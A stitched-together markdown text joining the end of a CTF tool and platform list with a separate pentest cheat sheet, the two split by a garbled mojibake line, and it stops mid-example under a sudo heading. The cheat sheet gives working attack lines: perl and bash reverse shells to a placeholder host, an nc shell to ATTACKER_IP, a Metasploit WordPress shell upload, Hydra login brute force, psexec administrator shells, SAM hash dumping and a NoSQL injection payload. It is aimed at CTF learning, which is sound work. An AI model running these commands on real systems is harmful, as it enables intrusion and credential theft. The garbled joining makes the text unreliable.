 - [Online Assembler/Disassembler](http://shell-storm.org/online/Online-Assembler-and-Disassembler/) - Online wrappers around the Keystone and Capstone projects.
 - [PEDA](https://github.com/longld/peda) - Python Exploit Development Assistance for GDB.
 - [PEfile](https://github.com/erocarrera/pefile) - Python module to read and work with PE (Portable Executable) files.
 - [Pwndbg](https://github.com/pwndbg/pwndbg) - Exploit Development and Reverse Engineering with GDB Made Easy.
 - [radare2](https://github.com/radareorg/radare2) - UNIX-like reverse engineering framework and command-line toolset.
 - [Rizin](https://github.com/rizinorg/rizin) - Rizin is a fork of the radare2 reverse engineering framework with a focus on usability, working features and code cleanliness.
 - [Uncompyle](https://github.com/gstarnberger/uncompyle) -  A Python 2.7 byte-code decompiler (.pyc)
 - [WinDBG](http://www.windbg.org/) - Windows debugger distributed by Microsoft.
 - [Z3](https://github.com/Z3Prover/z3) - A theorem prover from Microsoft Research.

## Steganography

*Tools used for solving Stego challenges*

 - [AperiSolve](https://aperisolve.fr/) - Platform which performs layer analysis on images.
 - [BPStegano](https://github.com/TapanSoni/BPStegano) - Python3 based LSB steganography.
 - [DeepSound](https://github.com/Jpinsoft/DeepSound) - Freeware steganography tool and audio converter that hides secret data into audio files.
 - [DTMF Detection](https://unframework.github.io/dtmf-detect/) - Audio frequencies common to a phone button.
 - [DTMF Tones](http://dialabc.com/sound/detect/index.html) - Audio frequencies common to a phone button.
 - [Exif](http://manpages.ubuntu.com/manpages/trusty/man1/exif.1.html) - Shows EXIF information in JPEG files.
 - [Exiv2](https://www.exiv2.org/manpage.html) - Image metadata manipulation tool.
 - [FotoForensics](https://fotoforensics.com/) - Provides budding researchers and professional investigators access to cutting-edge tools for digital photo forensics.
 - [hipshot](https://bitbucket.org/eliteraspberries/hipshot/src/master/) - Tool to converts a video file or series of photographs into a single image simulating a long-exposure photograph.
 - [Image Error Level Analyzer](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/) - Tool to analyze digital images. It's also free and web based. It features error level analysis, clone detection and more.
 - [Image Steganography](https://incoherency.co.uk/image-steganography/) - Client-side Javascript tool to steganographically hide/unhide images inside the lower "bits" of other images. 
 - [ImageMagick](http://www.imagemagick.org/script/index.php) - Tool for manipulating images.
 - [jsteg](https://github.com/lukechampine/jsteg) - Command-line tool to use against JPEG images.
 - [Magic Eye Solver](http://magiceye.ecksdee.co.uk/) - Get hidden information from images.
 - [Outguess](https://www.freebsd.org/cgi/man.cgi?query=outguess+&apropos=0&sektion=0&manpath=FreeBSD+Ports+5.1-RELEASE&format=html) - Universal steganographic tool.
 - [Pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html) - Verifies the integrity of PNG and dump all of the chunk-level information in human-readable form.
 - [Pngtools](https://packages.debian.org/sid/pngtools) - For various analysis related to PNGs.
 - [sigBits](https://github.com/Pulho/sigBits) - Steganography significant bits image decoder.
 - [SmartDeblur](https://github.com/Y-Vladimir/SmartDeblur) - Restoration of defocused and blurred photos/images.
 - [Snow](https://sbmlabs.com/notes/snow_whitespace_steganography_tool) - Whitespace Steganography Tool
 - [Sonic Visualizer](https://www.sonicvisualiser.org/) - Audio file visualization.
 - [Steganography Online](https://stylesuxx.github.io/steganography/) - Online steganography encoder and decoder.
 - [Stegbreak](https://linux.die.net/man/1/stegbreak) - Launches brute-force dictionary attacks on JPG image.
 - [StegCracker](https://github.com/Paradoxis/StegCracker) - Brute-force utility to uncover hidden data inside files.
 - [stegextract](https://github.com/evyatarmeged/stegextract) - Detect hidden files and text in images.
 - [Steghide](http://steghide.sourceforge.net/) - Hide data in various kinds of image- and audio-files.
 - [StegOnline](https://stegonline.georgeom.net/) - Conduct a wide range of image steganography operations, such as concealing/revealing files hidden within bits.
 - [Stegosaurus](https://github.com/AngelKitty/stegosaurus) - A steganography tool for embedding payloads within Python bytecode.
 - [StegoVeritas](https://github.com/bannsec/stegoVeritas) - Yet another stego tool.
 - [Stegpy](https://github.com/dhsdshdhk/stegpy) - Simple steganography program based on the LSB method.
 - [stegseek](https://github.com/RickdeJager/stegseek) - Lightning fast steghide cracker that can be used to extract hidden data from files. 
 - [stegsnow](https://manpages.ubuntu.com/manpages/trusty/man1/stegsnow.1.html) - Whitespace steganography program.
 - [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve) - Apply various steganography techniques to images.
 - [Zsteg](https://github.com/zed-0xff/zsteg/) - PNG/BMP analysis.


## Web 

*Tools used for solving Web challenges*

 - [Arachni](https://www.arachni-scanner.com/) - Web Application Security Scanner Framework.
 - [Beautifier.io](https://beautifier.io/) - Online JavaScript Beautifier.
 - [BurpSuite](https://portswigger.net/burp) - A graphical tool to testing website security.
 - [Commix](https://github.com/commixproject/commix) - Automated All-in-One OS Command Injection Exploitation Tool.
 - [debugHunter](https://github.com/devploit/debugHunter) - Discover hidden debugging parameters and uncover web application secrets.
 - [Dirhunt](https://github.com/Nekmo/dirhunt) - Find web directories without bruteforce.
 - [dirsearch](https://github.com/maurosoria/dirsearch) - Web path scanner.
 - [nomore403](https://github.com/devploit/nomore403) - Tool to bypass 40x errors.
 - [ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer written in Go.
 - [git-dumper](https://github.com/arthaud/git-dumper) - A tool to dump a git repository from a website.
 - [Gopherus](https://github.com/tarunkant/Gopherus) - Tool that generates gopher link for exploiting SSRF and gaining RCE in various servers.
 - [Hookbin](https://hookbin.com/) - Free service that enables you to collect, parse, and view HTTP requests.
 - [JSFiddle](https://jsfiddle.net/) - Test your JavaScript, CSS, HTML or CoffeeScript online with JSFiddle code editor.
 - [ngrok](https://ngrok.com/) - Secure introspectable tunnels to localhost.
 - [OWASP Zap](https://owasp.org/www-project-zap/) - Intercepting proxy to replay, debug, and fuzz HTTP requests and responses.
 - [PHPGGC](https://github.com/ambionics/phpggc) - Library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.
 - [Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en) - Addon for chrome for debugging network requests.
 - [REQBIN](https://reqbin.com/) - Online REST & SOAP API Testing Tool.
 - [Request Bin](https://requestbin.com/) - A modern request bin to inspect any event by Pipedream.
 - [Revelo](http://www.kahusecurity.com/posts/revelo_javascript_deobfuscator.html) - Analyze obfuscated Javascript code.
 - [Smuggler](https://github.com/defparam/smuggler) -  An HTTP Request Smuggling / Desync testing tool written in Python3.
 - [SQLMap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool.
 - [W3af](https://github.com/andresriancho/w3af) - Web application attack and audit framework.
 - [XSSer](https://xsser.03c8.net/) - Automated XSS testor.
 - [ysoserial](https://github.com/frohoff/ysoserial) - Tool for generating payloads that exploit unsafe Java object deserialization.

# 0x02. Resources

## Online Platforms

*Always online CTFs*

 - [0x0539](https://0x0539.net/) - Online CTF challenges.
 - [247CTF](https://247ctf.com/) - Free Capture The Flag Hacking Environment.
 - [Archive.ooo](https://archive.ooo/) - Live, playable archive of DEF CON CTF challenges.
 - [Atenea](https://atenea.ccn-cert.cni.es/) - Spanish CCN-CERT CTF platform.
 - [CTFlearn](https://ctflearn.com/) - Online platform built to help ethical hackers learn, practice, and compete.
 - [CTF365](https://ctf365.com/) - Security Training Platform.
 - [Crackmes.One](https://crackmes.one/) - Reverse Engineering Challenges.
 - [CryptoHack](https://cryptohack.org/) - Cryptography Challenges.
 - [Cryptopals](https://cryptopals.com/) - Cryptography Challenges.
 - [Defend the Web](https://defendtheweb.net/?hackthis) - An Interactive Cyber Security Platform.
 - [Dreamhack.io](https://dreamhack.io/wargame) - Online wargame.
 - [echoCTF.RED](https://echoctf.red/) - Online Hacking Laboratories.
 - [Flagyard](https://flagyard.com/) - An Online Playground of Hands-on Cybersecurity Challenges.
 - [HackBBS](https://hackbbs.org/index.php) - Online wargame.
 - [Hacker101](https://www.hacker101.com/) - CTF Platform by [HackerOne](https://www.hackerone.com/).
 - [Hackropole](https://hackropole.fr/en/) - This platform allows you to replay the challenges of the France Cybersecurity Challenge.
 - [HackTheBox](https://www.hackthebox.com/) - A Massive Hacking Playground.
 - [HackThisSite](https://www.hackthissite.org/) - Free, safe and legal training ground for hackers.
 - [HBH](https://hbh.sh/home) - Community designed to teach methods and tactics used by malicious hackers to access systems and sensitive information.
 - [Komodo](http://ctf.komodosec.com/) - This is a game designed to challenge your application hacking skills.
 - [MicroCorruption](https://microcorruption.com/) - Embedded Security CTF.
 - [MNCTF](https://mnctf.info/) - Online cybersecurity challenges.
 - [OverTheWire](https://overthewire.org/wargames/) - Wargame offered by the OverTheWire community.
 - [picoCTF](https://picoctf.org/) - Beginner-friendly CTF platform.
 - [Pwn.college](https://pwn.college/) - Education platform to learn about, and practice, core cybersecurity concepts.
 - [PWN.TN](https://pwn.tn/) - Educational and non commercial wargame.
 - [Pwnable.kr](http://pwnable.kr/) - Pwn/Exploiting platform.
 - [Pwnable.tw](https://pwnable.tw/) - Pwn/Exploiting platform.
 - [Pwnable.xyz](https://pwnable.xyz/) - Pwn/Exploiting platform.
 - [PWNChallenge](http://pwn.eonew.cn/) - Pwn/Exploiting platform.
 - [Reversing.kr](http://reversing.kr/) - Reverse Engineering platform.
 - [Root-me](https://www.root-me.org/) - CTF training platform.
 - [VibloCTF](https://ctf.viblo.asia/landing) - CTF training platform.
 - [VulnHub](https://www.vulnhub.com/) - VM-based pentesting platform.
 - [W3Challs](https://w3challs.com/) - Hacking/CTF platform.
 - [WebHacking](https://webhacking.kr/) - Web challenges platform.
 - [Websec.fr](http://websec.fr/) - Web challenges platform.
 - [WeChall](https://www.wechall.net/active_sites) - Challenge sites directory & forum.
 - [YEHD 2015](https://2015-yehd-ctf.meiji-ncc.tech/) - YEHD CTF 2015 online challenges.

*Self-hosted CTFs*

 - [AWSGoat](https://github.com/ine-labs/AWSGoat) - A Damn Vulnerable AWS Infrastructure.
 - [CICD-goat](https://github.com/cider-security-research/cicd-goat) - A deliberately vulnerable CI/CD environment. Learn CI/CD security through multiple challenges.
 - [Damn Vulnerable Web Application](https://dvwa.co.uk/) - PHP/MySQL web application that is damn vulnerable.
 - [GCPGoat](https://github.com/ine-labs/GCPGoat) - A Damn Vulnerable GCP Infrastructure.
 - [Juice Shop](https://github.com/juice-shop/juice-shop-ctf) - Capture-the-Flag (CTF) environment setup tools for OWASP Juice Shop. 

## Collaborative Tools

 - [CTFNote](https://github.com/TFNS/CTFNote) - Collaborative tool aiming to help CTF teams to organise their work.

## Writeups Repositories

*Repository of CTF Writeups*

 - [Courgettes.Club](https://ctf.courgettes.club/) - CTF Writeup Finder.
 - [CTFtime](https://ctftime.org/writeups) - CTFtime Writeups Collection.
 - [Github.com/CTFs](https://github.com/ctfs) - Collection of CTF Writeups.

## Courses

 - [Roppers Bootcamp](https://www.roppers.org/courses/ctf) - CTF Bootcamp.

# 0x03. Bibliography

*The resources presented here have been gathered from numerous sources. However, the most important are:*

 - [apsdehal_awesome-ctf](https://github.com/apsdehal/awesome-ctf)
 - [vavkamil_awesome-bugbounty-tools](https://github.com/vavkamil/awesome-bugbounty-tools)
 - [zardus_ctf-tools](https://github.com/zardus/ctf-tools)

ba≈üka bir g√ºn
-------------

## Contents

- [System Hacking](#system-hacking)
  - [Nmap Scanning](#nmap-scanning)
  - [Netdiscover Scanning](#netdiscover-scanning)
  - [Nikto Scanning](#nikto-scanning)
  - [WebServer is Open](#webserver-is-open)
  - [Directory Bursting](#directory-bursting)
  - [Generating Wordlist from the Website](#generating-wordlist-from-the-website)
  - [SMB is Open](#smb-is-open)
  - [To Extract and Mount VHD Drive Files](#to-extract-and-mount-vhd-drive-files)
  - [To search for Exploits on Metasploit by Name](#to-search-for-exploits-on-metasploit-by-name)
  - [Wordpress Open](#wordpress-open)
  - [RPC Open](#rpc-open)
  - [Powershell](#powershell)
  - [NOSql Code Injection](#nosql-code-injection)
- [Web Hacking](#web-hacking)
  - [Five Stages of Web Hacking](#five-stages-of-web-hacking)
  - [Enumeration and Reconnaissance Tools](#enumeration-and-reconnaissance-tools)
  - [Scanning](#scanning)
  - [Payloads](#payloads)
  - [Shells](#shells)
  - [BufferOverflow](#bufferoverflow)
  - [Gobuster](#gobuster)
  - [SQLMAP](#sqlmap)
- [File Hacking](#file-hacking)
  - [Extract hidden text from PDF Files](#extract-hidden-text-from-pdf-files)
  - [Compress File Extraction](#compress-file-extraction)
  - [Extract hidden strings](#extract-hidden-strings)
- [Cryptography](#cryptography)
  - [Caesar Cipher](#caesar-cipher)
  - [Vigenere Cipher](#vigenere-cipher)
  - [One Time Pad Cipher](#one-time-pad-cipher)
- [Forensics](#forensics)
  - [Image File](#image-file)
  - [Binwalk](#binwalk)
  - [Extract NTFS Filesystem](#extract-ntfs-filesystem)
  - [Recover Files from Deleted File Systems](#recover-files-from-deleted-file-systems)
  - [Packet Capture](#packet-capture)
  - [JavaScript Deobfuscator](#javascript-deobfuscator)
- [Password Cracking](#password-cracking)
  - [JOHN the ripper](#john-the-ripper)
  - [SAM Hashes](#sam-hashes)
  - [Linux User Hashes](#linux-user-hashes)
  - [Hashcat](#hashcat)
  - [7z Password Cracking](#7z-password-cracking)
  - [SSH Password Cracking](#ssh-password-cracking)
- [Privilige Escalation](#privilige-escalation)
  - [Standard Scripts for Enumeration](#standard-scripts-for-enumeration)
  - [Reconnoitre](#reconnoitre)

<!-- tocstop -->

## System Hacking 

### Nmap Scanning

To scan for systems and Open Services/Ports, Use Nmap.

```
> $ nmap -sV <HOST_IP>
```
To scan for Vulnerabilities on system.

```
> $ nmap --script vuln <HOST_IP>
```
To scan for all ports, SYN Scan and OS detection.

```
> $ nmap -sS -T4 -A -p- <HOST_IP>
```
To scan using inbuilt nmap scripts.

```
> $ nmap --script ssl-enum-ciphers -p 443  <HOST_IP>
```

### Netdiscover Scanning

To passively discover machines on the network, Use Netdiscover.

```
> $ netdiscover -i <INTERFACE>
  Currently scanning: 192.168.17.0/16   |   Screen View: Unique Hosts                                                           3 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 480                                                               _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
  -----------------------------------------------------------------------------
  192.168.1.1     11:22:33:44:55:66      1      60  NETGEAR                                                                                           
  192.168.1.2     21:22:33:44:55:66      1      60  Apple, Inc.                                                                                      
  192.168.1.8     41:22:33:44:55:66      1      60  Intel Corporate 
```

### Nikto Scanning

To scan for vulnerabilities use Nikto.

```
> $ nikto -h <HOST_IP>
```

### WebServer is Open 

If Port 80 or 443 is open, we can look for robots.txt to check for hidden flags or clues.

To find the Webserver version, Use Curl tool with `I` flag.
```
> $ curl -I <SERVER_IP>
HTTP/1.1 200 OK
Date: Mon, 11 May 2020 05:18:21
Server: gws
Last-Modified: Mon, 11 May 2020 05:18:21
Content-Length: 4171
Content-Type: text/html
Connection: Closed
```

If Port 80 is Closed and its the only port opened on the machine, it can be due to presence of IDS or Port knocking.
- We can give a timeout and try scanning after sometime to check if the port is still closed.
- To check if Port is Open without knocking on IDS using TCP Scan instead of SYN Scan.
```
> $ nmap -p 80 <SERVER_IP> -sT
Starting Nmap 7.80 ( https://nmap.org ) 
Nmap scan report for 10.10.10.168
Host is up (0.038s latency).

PORT     STATE  SERVICE
80/tcp   closed http
Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```

### Directory Bursting

To enumerate directories on a webserver, Use wfuzz.

```
> $ wfuzz -u http://<SERVER_IP>/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://<SERVER_IP>/FUZZ/
```

### Generating Wordlist from the Website

```
> $ cewl -w wordlist.txt -d 10 -m 1 http://<SERVER_IP>/

$ wc wordlist.txt 
 354  354 2459 wordlist.txt
```


### SMB is Open

If SMB has misconfigured anonymous login, Use smbclient to list shares.

```
> $ smbclient -L \\\\<HOST_IP>
```

If SMB Ports are open, we can look for anonymous login to mount misconfigured shares.

```
> $ mkdir /mnt/smb
> $ mount -t cifs //<REMOTE_SMB_IP>/<SHARE> /mnt/smb/
Password for root@//<HOST_IP>/<SHARE>: 
```
 
If we found Administrator Credentials for SMB, Access the root shell using this method.

```
> $ /opt/impacket/examples# smbmap -u administrator -p password -H <HOST_IP>
[+] Finding open SMB ports....
[+] User SMB session establishd on <HOST_IP>...
[+] IP: <HOST_IP>:445	Name: <HOST_IP>                                      
	 Disk                                                  	Permissions
	 ----                                                  	-----------
	 ADMIN$                                            	READ, WRITE
	 Backups                                           	READ, WRITE
	 C$                                                	READ, WRITE
	 IPC$                                              	READ ONLY
  
> $ /opt/impacket/examples# python psexec.py administrator@<HOST_IP>
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

  Password:
  [*] Requesting shares on <HOST_IP>.....
  [*] Found writable share ADMIN$
  [*] Uploading file tJJmcVQN.exe
  [*] Opening SVCManager on <HOST_IP>.....
  [*] Creating service RKAe on <HOST_IP>....
  [*] Starting service RKAe.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 10.0.14393]
  (c) 2016 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>
```

### To Extract and Mount VHD Drive Files

```
> $ 7z l <FILENAME>.vhd
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz (306D4),ASM,AES-NI)
Scanning the drive for archives:
1 file, 5418299392 bytes (5168 MiB)
Listing archive: <FILENAME>.vhd

> $ guestmount --add <VHD_NAME>.vhd --inspector -ro -v /mnt/vhd
```

### To search for Exploits on Metasploit by Name

```
> $ searchsploit apache 1.2.4
```

### Wordpress Open

If `/wp-login.php` is found in the Enumeration scanning, it can be Wordpress site.

To crack the login credentials for Wordpress, Use Hydra. We can use Burpsuite to capture the request parameters
```
> $ hydra -V -l wordlist.dic -p 123 <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username
```

To scan Wordpress site for Vulnerabilities.

```
> $ gem install wpscan
> $ wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic
```

To get a reverse shell using Admin Upload.

```
> $ msfconsole
> $ use exploit/unix/webapp/wp_admin_shell_upload
```

### RPC Open

If RPC is open, we can login using rpclient.

```
> $ rpcclient -U "" <HOST_IP>
```

### Powershell
To bypass execution policy
```
> $ powershell.exe -exec bypass
```

### NOSql Code Injection

```
username[$ne]=help&password[$ne]=help&login=login
```

## Web Hacking

### Five Stages of Web Hacking

```
    * Reconnaissance
    * Scanning and Enumeration
    * Gaining Access
    * Maintaining Access
    * Covering Tracks
```

### Enumeration and Reconnaissance Tools

- Whois, Nslookup, Dnsrecon, Google Fu, Dig - To passively enumerate website.
- [Sublist3r](https://github.com/aboul3la/Sublist3r) - Subdomains enumeration tool.
- [crt.sh](https://crt.sh) - Certificate enumeration tool.
- [Hunter.io](https://hunter.io/) - Email enumeration tool.
- Nmap, Wappalyzer, Whatweb, Builtwith, Netcat - Fingerprinting tools.
- HaveIbeenPwned - Useful for breach enumeraton.
- Use [SecurityHeaders](https://securityheaders.com/) to find some misconfigured header information on target website.
- Use Zap Proxy tool to extract hidden files/directories.
- Clear Text Passwords [Link](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)

To gather information from online sources.

```
> $ theharvester -d microsoft.com -l 200 -g -b google
```

### Scanning

Ping Sweep a network.

```
> $ nmap -sn <NETWORK>
```

SYN Scan with Speed of 4 and port of common 1000 TCP.

```
> $ nmap -T4 <NETWORK>
```

All Port scan with All Scanning including OS, Version, Script and Traceroute.

```
> $ nmap -T4 -A -p- <NETWORK>
```

To scan for UDP Ports (Dont scan all scans, as it takes lot of time).


```
> $ nmap -sU -T4 <NETWORK>
```

### Payloads

Non Staged Payload Example.

```
windows/meterpreter_reverse_tcp
```

Staged Payload Example.

```
windows/meterpreter/reverse_tcp
```

### Shells

To use bind shell, we have to follow two steps: 1, Create a Bind Shell 2,Listen for connection.
```
> $ nc <ATTACKER_IP> <ATTACKET_PORT>` 
```

```
> $ nc -lvp <ATTACKER_PORT>
```

If website is launching perl reverse shell, we can modify it to get better shell using Bash oneliner.

```
> $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"<HOST_IP>:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' 2>&1
```

```
> $ bash -c 'bash -i &> /dev/tcp/<HOST_IP>/9001 0>&1'
```

### BufferOverflow
To generate shellcode quickly, we can use python `pwn` library.
```
> $ python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))
```

```
> $ (python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln
```

### Gobuster

Normal Enumeration.

```
> $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

```

With Cookie (Useful to directory traversal when cookie is needed).
```
> $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -c PHPSESSID=<COOKIE_VALUE>
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://<IP_ADDRESS>
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        <COOKIE_VALUE>
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/19 01:43:01 Starting gobuster
===============================================================
/home.php (Status: 302)
/index.php (Status: 200)
```

### SQLMAP 
Redirect the HTTP Request to Burpsuite and we can see the request like this.
```
POST / HTTP/1.1
Host: <IP_ADDRESS>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://<IP_ADDRESS>/
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Connection: close
Upgrade-Insecure-Requests: 1

search=help
```
Now Right click and click on `copy to file` option.
```
> $ sqlmap -r search.req --batch --force-ssl
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:25:16 /2020-04-19/

[01:25:16] [INFO] parsing HTTP request from 'search.req'
[01:25:17] [INFO] testing connection to the target URL
[01:25:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[01:25:17] [INFO] testing if the target URL content is stable
[01:25:18] [INFO] target URL content is stable
[01:25:18] [INFO] testing if POST parameter 'search' is dynamic
[01:25:18] [WARNING] POST parameter 'search' does not appear to be dynamic
[01:25:18] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[01:25:19] [INFO] testing for SQL injection on POST parameter 'search'
[01:25:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[01:25:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[01:25:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[01:25:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
```


## File Hacking

### Extract hidden text from PDF Files

If something is hidden on a pdf which we need to find, we can Press `Ctrl + A` to copy everything on the pdf and paste on notepad.
If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
Else solve using pdf-uncompress tools like `qpdf` to convert compressed data to redeable format.

### Compress File Extraction

If there is `PK` at the start of the file in the magic bytes, its most probably `ZIP` File.

To extract data from recursive zip file.

```
> $ binwalk -Me <FILE_NAME>
```

### Extract hidden strings

If file is having some hidden text, we can use `hexeditor` or `strings` commands to locate the flag.

If hidden text has == at the end, it is `base64` encoded.

To monitor the appplication calls of a binary.

```
> $ strace -s -f 12345 -e trace=recv,read <PROGRAM>
```

To track all Application & library calls of a program.

```
> $ ltrace ./<PROG_NAME>
```

## Cryptography

### Caesar Cipher 

If there is word `caesar` in the question or hint, it can be a substitution cipher.

If you find `!` in the cipher text and cipher seems to be within certain range of Letters and appears to be transposition of a plain text, Use this website [Ceasar Box](https://www.dcode.fr/caesar-box-cipher) to Bruteforce the hidden message.

### Vigenere Cipher

To break Vigenere ciphers without knowing the key.
- Use this website [Link](https://www.guballa.de/vigenere-solver) - Bruteforce solver.

### One Time Pad Cipher
To solve One Time Pad, Use [OTP](http://rumkin.com/tools/cipher/otp.php).


```
> $ /usr/share/john/ssh2john.py id_rsa > output.hash
```

## Forensics

### Image File

Try `file` comamnd on the image to learn more information.

To extract data inside Image files.

```
> $ zsteg <FILE_NAME>
```

To check for metadata of the Image files.

```
> $ exiftool <FILE_NAME>
```

To search for particular string or flag in an Image file.

```
> $ strings <FILE_NAME> | grep flag{
```

To extract data hidden inside an image file protected with password.

```
> $ steghide extract -sf <FILE_NAME>
```

### Binwalk

Binwalk helps to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to <FILE_NAME>.zip to find interesting data.
```
> $ binwalk <IMAGE_NAME>
```

### Extract NTFS Filesystem

```
If there is ntfs file, extract with 7Zip on Windowds. 
If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>`.
Then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
```

To extract ntfs file system on Linux.

```
> $ sudo mount -o loop <FILENAME.ntfs> mnt
```

### Recover Files from Deleted File Systems

To Recover Files from Deleted File Systems from Remote Hosts.
```
> $ ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz
> $ gunzip -d extract.dd.gz
> $ binwalk -Me extract.dd
```

### Packet Capture
If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
```
> $ tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields
```

### JavaScript Deobfuscator

To Deobfuscate JavaScript, use [Jsnice](http://www.jsnice.org/).

## Password Cracking

### JOHN the ripper

If there is `JOHN` in the title or text or hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
```
> $ john <HASHES_FILE> --wordlist=/usr/share/wordlists/rockyou.txt
```

To crack well known hashes, use [Link](https://crackstation.net/)

### SAM Hashes

To get System User Hashes, we can follow this method.
```
> $ /mnt/vhd/Windows/System32/config# cp SAM SYSTEM ~/CTF/
> $ /mnt/vhd/Windows/System32/config# cd ~/CTF/
> ~/CTF# ls
  SAM  SYSTEM  
> ~/CTF# mkdir Backup_dump
> ~/CTF# mv SAM SYSTEM Backup_dump/
> ~/CTF# cd Backup_dump/
> ~/CTF/Backup_dump# ls
  SAM  SYSTEM
> ~/CTF/Backup_dump# impacket-secretsdump -sam SAM -system SYSTEM local
  Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

  [*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  User:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
  [*] Cleaning up... 
```

### Linux User Hashes
If we able to extract /etc/passwd and /etc/shadow file we can use `unshadow`
```
> $ unshadow <PASSWD> <SHADOW>
```

### Hashcat

To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace it accordingly.
```
> $ hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### 7z Password Cracking

To extract 7z password, Use tool `7z2john`

### SSH Password Cracking

To crack encrypted ssh key use `ssh2john` tool.

## Privilige Escalation

### Standard Scripts for Enumeration
- [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker) - Linux Privilige Enumeration Checker.
- [Awesome Priv](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [Lin Enum Script](https://github.com/rebootuser/LinEnum)
- [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
- [Pspy](https://github.com/DominicBreuker/pspy) - Information on cronjobs, proceses on target system.
- [JAWS](https://github.com/411Hall/JAWS) - Windows Enumeration Script.
- [Cyberchef](https://github.com/gchq/CyberChef) - A web app for encryption, encoding, compression and data analysis.
- [Pspy](https://github.com/DominicBreuker/pspy) - Gather information on cron, proceses.
- [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.

#### Dirtycow 

On older linux kernals, we can gain root access using dirtycow exploit.

To Use DirtyCow : [Link](https://dirtycow.ninja/) - Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)

#### Sudo 

To check what sudo command can the current user run with no-password.

```
> $ sudo -l
```

Examples:

```
> $ sudo -l
User www-data may run the following commands on bashed:
